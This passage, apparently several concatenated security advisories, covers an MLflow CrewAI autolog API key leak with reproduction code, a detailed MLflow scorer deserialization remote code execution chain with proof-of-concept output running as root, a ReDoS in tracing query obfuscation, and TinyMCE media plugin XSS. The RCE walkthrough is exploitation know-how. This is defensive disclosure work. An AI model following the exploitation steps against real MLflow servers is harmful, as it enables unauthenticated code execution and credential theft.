from crewai import LLM, Agent

autolog = importlib.import_module("mlflow.crewai.autolog")

llm = LLM(
    model="gpt-4.1-mini",
    api_key="sk-proj-EXAMPLE1234567890",
)

agent = Agent(
    role="r",
    goal="g",
    backstory="b",
    llm=llm,
)

attrs = autolog._get_agent_attributes(agent)

assert "sk-proj-EXAMPLE1234567890" in attrs["llm"]

print(attrs["llm"])
```

The output contains the API key in plaintext, for example:

```text
llm_type='openai' model='gpt-4.1-mini' ... api_key='sk-proj-EXAMPLE1234567890' ...
```

No provider request is required.

#### 2. End-to-end trace disclosure

The issue can also be reproduced through MLflow's actual OTLP exporter.

Configure a local OTLP HTTP receiver and set:

```bash
export OTEL_EXPORTER_OTLP_TRACES_ENDPOINT=http://127.0.0.1:4318/v1/traces
export OTEL_EXPORTER_OTLP_TRACES_PROTOCOL=http/protobuf
export CREWAI_DISABLE_TELEMETRY=true
```

Then run:

```python
import mlflow

from crewai import Agent, Crew, LLM, Task

mlflow.crewai.autolog()

llm = LLM(
    model="gpt-4.1-mini",
    api_key="sk-proj-EXAMPLE1234567890",
)

agent = Agent(
    role="Support Responder",
    goal="Answer support questions",
    backstory="A support agent",
    llm=llm,
)

task = Task(
    description="Answer the user's question",
    expected_output="A response",
    agent=agent,
)

crew = Crew(
    agents=[agent],
    tasks=[task],
)

crew.kickoff()
```

A local OTLP receiver can decode the `ExportTraceServiceRequest` sent by MLflow.

The provider request is expected to fail because the credential is intentionally fake. This does not affect the vulnerability: the sensitive value is added to the MLflow span when the instrumentation starts, before the provider call succeeds or fails.

In the tested environment, the fake API key appeared in the exported telemetry in **5 locations across 2 spans**, including:

```text
Support Responder
  attributes.llm
  attributes.function_calling_llm
  attributes.agent_executor
  attributes.mlflow.spanInputs

Task.execute_sync
  attributes.mlflow.spanInputs
```

The captured value is produced by MLflow's actual telemetry/export path rather than being manually inserted into a span.

All credentials used in the reproduction are locally generated fake values. No real API credential is required.

### Impact

**Type:** Sensitive Information Disclosure / Credential Disclosure
**CWE:** CWE-532 — Insertion of Sensitive Information into Log File

Any application using `mlflow.crewai.autolog()` with a CrewAI `LLM` configured with an API key can unintentionally disclose that credential through MLflow traces.

The credential is written to trace telemetry even though the application does not explicitly log it.

Anyone with access to the MLflow trace storage or configured OTLP destination may therefore obtain the provider credential. Depending on the deployment, this can include MLflow users, observability operators, or third-party telemetry providers.

The leaked credential can then potentially be used against the corresponding LLM provider account, including for unauthorized API usage and associated costs.

The issue is particularly significant because the credential crosses a trust boundary: a provider API key intended for use by the application is automatically copied into observability telemetry where a broader set of users or systems may have access.

The vulnerability does not require the developer to intentionally log the secret. The only relevant prerequisite is enabling the CrewAI autologging integration.

### Patches

Fixed in MLflow 3.17.0 by #25845. `mlflow.crewai.autolog()` now reduces CrewAI LLM objects to their model name and drops credential-like keys before they are written to span attributes or `mlflow.spanInputs`.

### Remediation

- Upgrade to `mlflow>=3.17.0`.
- Upgrading stops new leakage but does not remove credentials already written. Rotate any LLM provider key that a CrewAI `LLM` object held (for example one passed as `LLM(api_key=...)`) while `mlflow.crewai.autolog()` was enabled on MLflow 2.19.0 through 3.16.x.
- Delete or redact the affected traces in the MLflow tracking backend and in any OTLP destination they were exported to. The key appears in Agent and Crew span attributes and in `mlflow.spanInputs`.

### Workarounds

If you cannot upgrade yet, disable CrewAI autologging with `mlflow.crewai.autolog(disable=True)`.

cves.summary:
## Summary MLflow 3.12.0 introduced registration and deserialization support for third-party scorers in OSS MLflow. During scorer deserialization, the server accepts a request-controlled Python module path beneath one of four allowed package prefixes, imports that module, obtains a request-controlled class, and instantiates it synchronously. An HTTP caller can combine this behavior with MLflow's built-in experiment, run, and artifact-upload endpoints: 1. Create an experiment whose local artifact location points to a writable allowed scorer package. 2. Create a run, causing MLflow to allocate `//artifacts/`. 3. Upload a Python module into that run artifact directory. 4. Submit a serialized third-party scorer whose module path resolves to the uploaded file. 5. Trigger server-side import and class construction through `/ajax-api/3.0/mlflow/scorer/invoke`. On the default no-auth server using the official MLflow v3.14.0 image, this produces unauthenticated arbitrary Python code execution with the privileges of the MLflow server process. The reproduced image runs the process as uid 0 and permits writes to its installed Python package tree. The attached proof of concept is intentionally harmless. The uploaded constructor performs one action only: it writes a random marker beside its own uploaded run artifact. The marker is then downloaded through MLflow's run-artifact endpoint and checked for an exact match. ## Technical details ### 1. The allow-list accepts attacker-created descendants At release commit `86cd7f5a1dc25a1387ad07c87811bbc30f62951c`, `mlflow/genai/scorers/scorer_utils.py` defines these allowed roots: ```python THIRD_PARTY_SCORER_ALLOWED_MODULES = frozenset({ "mlflow.genai.scorers.ragas", "mlflow.genai.scorers.deepeval", "mlflow.genai.scorers.trulens", "mlflow.genai.scorers.phoenix", }) ``` In `mlflow/genai/scorers/base.py`, the deserializer accepts either an exact root or any descendant: ```python module_path == m or module_path.startswith(m + ".") ``` It then performs the following operations using request-controlled values: ```python module = importlib.import_module(module_path) scorer_class = getattr(module, class_name, None) scorer_instance = scorer_class(**init_kwargs) ``` A package-name prefix is not a provenance boundary. If the server process can write below an allowed package, an attacker-created descendant can satisfy the string-prefix check and become importable Python code. Relevant source locations at the v3.14.0 release commit: * `mlflow/genai/scorers/scorer_utils.py`, allowed third-party scorer modules * `mlflow/genai/scorers/base.py`, third-party scorer deserialization and construction ### 2. Deserialization occurs before trace processing In `mlflow/server/handlers.py`, `_invoke_scorer_handler()` parses the supplied serialized scorer and calls: ```python scorer = Scorer.model_validate_json(serialized_scorer) ``` Only after deserialization and construction does the handler call: ```python batches = get_trace_batches_for_scorer(trace_ids, scorer, tracking_store) ``` The attacker-controlled constructor therefore runs before the server validates or resolves the supplied trace IDs. The minimal proof class is deliberately not a complete MLflow scorer. After its constructor writes the marker, later trace-batching logic accesses scorer attributes that the proof class does not implement. The resulting HTTP 500 occurs after code execution and does not invalidate the proof. No background job execution or special job-execution server option is required to reach the constructor. ### 3. MLflow's artifact layout places the module under the trusted prefix The experiment creation endpoint accepts an `artifact_location`. For file-backed experiments, MLflow derives each run artifact directory as: ```text //artifacts/ ``` The proof of concept selects this package directory in the official v3.14.0 image: ```text file:///usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens ``` After creating a run and uploading `audit_.py`, the resulting filesystem location is: ```text /usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens//artifacts/audit_.py ``` The corresponding import path is: ```text mlflow.genai.scorers.trulens..artifacts.audit_ ``` The attack does not overwrite an existing package module. It creates a new run-scoped module in the normal file-backed artifact layout. The run ID is returned to the caller. ### 4. Authentication and authorization behavior With authentication disabled, as in the default reproduced server configuration, no credentials are required. When MLflow basic authentication is enabled, authentication still applies. However, the scorer-invocation AJAX endpoint is assigned to `validate_gateway_proxy`, which returns `True` without performing an experiment- or scorer-level resource permission check. Practical exploitation in an authenticated deployment still requires the caller to create an experiment and run and upload artifacts to them. The key authorization issue is that scorer deserialization itself is not gated by a resource-specific permission check for the supplied experiment before the import occurs. ## Proof of concept The attached reproduction is intentionally isolated: * exact official MLflow v3.14.0 image pinned by manifest digest; * Docker network disabled; * MLflow bound to container loopback; * no shell command or external callback; * no external request; * no host filesystem write; * marker created beside the uploaded run artifact; * marker retrieved through the run-artifact download endpoint; and * disposable container removed after completion. Run: ```bash ./run-official-image.sh ``` Expected output: ```text MLFLOW_VERSION=3.14.0 PACKAGE_DIR=/usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens CREATE_EXPERIMENT_STATUS=200 CREATE_RUN_STATUS=200 UPLOAD_STATUS=200 INVOKE_STATUS=500 PROOF_DOWNLOAD_STATUS=200 PROOF_MATCH=1 RESULT=AFFECTED ``` The security-relevant result is: ```text PROOF_MATCH=1 RESULT=AFFECTED ``` This proves that the attacker-controlled constructor executed in the MLflow server process before the later scorer-processing failure. ## Reproduction environment * **Release:** MLflow v3.14.0 * **Release commit:** `86cd7f5a1dc25a1387ad07c87811bbc30f62951c` * **Official image:** `ghcr.io/mlflow/mlflow:v3.14.0` * **Manifest digest:** `sha256:967de3ca34b6a5751718e380a0a383eb0ce1a6f5b484f363bd0da7559117a5f8` * **Python version:** 3.10.18 * **Image-configured user:** empty * **Observed runtime user:** uid 0 * **Server bind:** `127.0.0.1:5000` * **Container network:** disabled * **Backend store:** `sqlite:////work/mlflow.db` * **Default artifact root:** `/work/artifacts` * **Authentication:** disabled * **Special job-execution option:** none Server command inside the disposable container: ```bash mlflow server \ --host 127.0.0.1 \ --port 5000 \ --backend-store-uri sqlite:////work/mlflow.db \ --default-artifact-root /work/artifacts ``` ## Affected range and source lineage The vulnerable third-party scorer deserialization behavior was introduced by commit: ```text 02eea26035b9d8e65af31e6e8f058ca195f62cdd Enable third-party scorer registration in OSS MLflow (#22634) ``` The feature is absent from v3.11.1 and first appears in v3.12.0. Runtime reproduction succeeds on v3.14.0. The relevant `mlflow/genai/scorers/base.py` content is unchanged at master commit: ```text 20858c9426a9644dfcf9545a92cbb534376779eb ``` No fixed release was identified as of 2026-07-12. ## Impact On the reproduced stock no-auth image, any network caller who can reach the tracking server can execute Python code as the MLflow process without credentials or user interaction. Successful exploitation provides confidentiality, integrity, and availability impact over all data, credentials, network access, and filesystem locations available to the MLflow server process. The stock image's runtime uid 0 increases container-level impact. Host impact still depends on the container runtime configuration, mounted paths, granted capabilities, socket exposure, and other isolation controls. In authentication-enabled deployments, exploitation requires an authenticated principal capable of creating an experiment and run and uploading artifacts. The exact chain also requires the server process to be able to write beneath one of the allowed scorer packages. This condition holds in the reproduced official image and may hold in virtual environments installed and run by the same operating-system user. A read-only container filesystem or a scorer package directory owned by a different, non-writable user blocks this exact placement chain. ## Artifacts and attachments ### Remote proof-of-concept script POC Script: [new_remote_poc.py](https://github.com/user-attachments/files/29936616/new_remote_poc.py) The remote proof of concept was then executed as follows. The disposable machine’s public IP has been redacted: ```bash python3 new_remote_poc.py \ --target http:// \ --package-dir /usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens \ --acknowledge-owned-target I_OWN_THIS_TARGET ``` The complete sanitized output was: ```text TARGET=http:// VERSION_STATUS=200 MLFLOW_VERSION=3.14.0 CREATE_EXPERIMENT_STATUS=200 EXPERIMENT_ID=2 CREATE_RUN_STATUS=200 RUN_ID=9a2d665eb38940b68983f0586f623115 UPLOAD_STATUS=200 IMPORT_PATH=mlflow.genai.scorers.trulens.9a2d665eb38940b68983f0586f623115.artifacts.audit_1783843760683972103 INVOKE_STATUS=500 INVOKE_RESPONSE_PREVIEW='\n\n500 Internal Server Error\n

Internal Server Error

\n

The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.

\n' PROOF_DOWNLOAD_STATUS=200 EXPECTED_MARKER_SHA256=7a423b479df3524567fdf8cc3e7f6c4bfccc577fbcc4bac9519db8bd1cc61ed5 PROOF_MATCH=1 SERVER_CLEANUP_PATH=/usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens/9a2d665eb38940b68983f0586f623115 PROOF_OUTPUT_BEGIN { "cwd": "/", "machine": "x86_64", "marker": "MLFLOW_REMOTE_SAFE_MARKER_1783843760683972103", "os_release": "PRETTY_NAME=\"Debian GNU/Linux 11 (bullseye)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"11\"\nVERSION=\"11 (bullseye)\"\nVERSION_CODENAME=bullseye\nID=debian\nHOME_URL=\"https://www.debian.org/\"\nSUPPORT_URL=\"https://www.debian.org/support\"\nBUG_REPORT_URL=\"https://bugs.debian.org/\"\n", "platform": "Linux-7.0.0-1006-aws-x86_64-with-glibc2.31", "python_implementation": "CPython", "python_version": "3.10.18", "server_datetime_utc": "2026-07-12T08:09:43.555055+00:00", "whoami": "root", "whoami_returncode": 0, "whoami_stderr": "" } PROOF_OUTPUT_END RESULT=AFFECTED EXPERIMENT_METADATA_CLEANUP_STATUS=200 CLEANUP_NOTE=discard the temporary test instance or remove SERVER_CLEANUP_PATH on the owned host ``` The proof file was also verified directly inside the disposable container: ```bash cat /usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens/9a2d665eb38940b68983f0586f623115/artifacts/execution-proof-1783843760683972103.json ``` The file contained: ```json { "cwd": "/", "machine": "x86_64", "marker": "MLFLOW_REMOTE_SAFE_MARKER_1783843760683972103", "os_release": "PRETTY_NAME=\"Debian GNU/Linux 11 (bullseye)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"11\"\nVERSION=\"11 (bullseye)\"\nVERSION_CODENAME=bullseye\nID=debian\nHOME_URL=\"https://www.debian.org/\"\nSUPPORT_URL=\"https://www.debian.org/support\"\nBUG_REPORT_URL=\"https://bugs.debian.org/\"\n", "platform": "Linux-7.0.0-1006-aws-x86_64-with-glibc2.31", "python_implementation": "CPython", "python_version": "3.10.18", "server_datetime_utc": "2026-07-12T08:09:43.555055+00:00", "whoami": "root", "whoami_returncode": 0, "whoami_stderr": "" } ``` The results demonstrate that: * the attacker-controlled module was uploaded beneath an allowed scorer package; * MLflow imported the request-selected module and invoked its constructor; * the constructor executed as the MLflow server process, which ran as `root` in the reproduced official image; * the constructor created a server-side proof file containing a random marker and bounded runtime information; * the proof file was retrieved successfully through MLflow’s artifact-download endpoint; and * the later HTTP 500 occurred only after constructor execution. The authoritative reproduction indicators are: ```text UPLOAD_STATUS=200 PROOF_DOWNLOAD_STATUS=200 PROOF_MATCH=1 RESULT=AFFECTED ``` The disposable cloud machine and container were removed after testing. Local Reproduction Scripts: [run-official-image.sh](https://github.com/user-attachments/files/29936514/run-official-image.sh) [poc_local.py](https://github.com/user-attachments/files/29936506/poc_local.py)

cves.summary:
### Summary

A regular expression used to obfuscate URL query strings can consume excessive CPU when processing certain attacker-controlled input. This can stall request processing and cause denial of service in applications using affected HTTP tracing integrations.

### Details

The default query-string obfuscation pattern can exhibit excessive backtracking. The pattern is applied synchronously when recording HTTP URL metadata, allowing query-string processing to occupy application resources for an extended period.

As a workaround, set DD_TRACE_OBFUSCATION_QUERY_STRING_REGEXP to the fixed regex below, then restart the application.

```

```

### Proof of concept

Detailed triggering inputs and reproduction steps are omitted from this advisory. The patched version includes regression coverage for the affected behavior.

### Impact

Regular expression denial of service (ReDoS) affecting applications that process attacker-controlled URL query strings through the vulnerable obfuscation pattern. Successful exploitation can cause excessive CPU consumption, prolonged request latency, and service unavailability.

The vulnerable processing is enabled by default for affected HTTP integrations that include query strings in URL span tags.

### Impact
Stored XSS vulnerability in the media plugin. Attackers can inject malicious scripts via elements crafted through the data-mce-object attribute, which are created and executed before sanitization. Impacts users of TinyMCE with the media plugin enabled.

### Patches
This vulnerability has been patched in TinyMCE 8.9.3 and TinyMCE 7.9.4 by ensuring that, when using the media plugin, any content created through the data-mce-object attribute is properly sanitized first.

### Workarounds
No official workaround available.

### Fix
To avoid this vulnerability:

Upgrade to TinyMCE 8.9.3 or higher.
Upgrade to TinyMCE 7.9.4 or higher.
